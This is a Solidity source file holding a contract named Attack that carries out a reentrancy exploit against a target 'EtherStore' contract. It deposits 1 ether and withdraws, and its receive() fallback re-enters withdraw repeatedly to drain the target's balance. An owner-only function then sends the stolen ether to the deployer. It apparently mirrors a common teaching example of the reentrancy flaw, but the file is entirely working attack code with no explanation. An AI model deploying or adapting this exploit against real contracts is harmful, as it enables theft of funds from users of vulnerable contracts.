// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

contract Attack {
    address private owner;
    address private etherStoreAddress;

    constructor(address _etherStoreAddress) {
        owner = msg.sender;
        etherStoreAddress = _etherStoreAddress;
    }

    receive() external payable {
        if (etherStoreAddress.balance >= 1 ether) {
            (bool ok,) = etherStoreAddress.call(
                abi.encodeWithSignature("withdraw(uint256)", 1 ether)
            );
            assert(ok);
        }
    }

    function attackEtherStore() external payable {
        (bool ok,) = etherStoreAddress.call{value: 1 ether}(
            abi.encodeWithSignature("deposit()")
        );
        (bool ok2,) = etherStoreAddress.call(
            abi.encodeWithSignature("withdraw(uint256)", 1 ether)
        );
        assert(ok&&ok2);
    }

    function withdraw() external {
        require(msg.sender == owner, "not owner");
        (bool ok,) = payable(msg.sender).call{value: address(this).balance}("");
        assert(ok);
    }
}
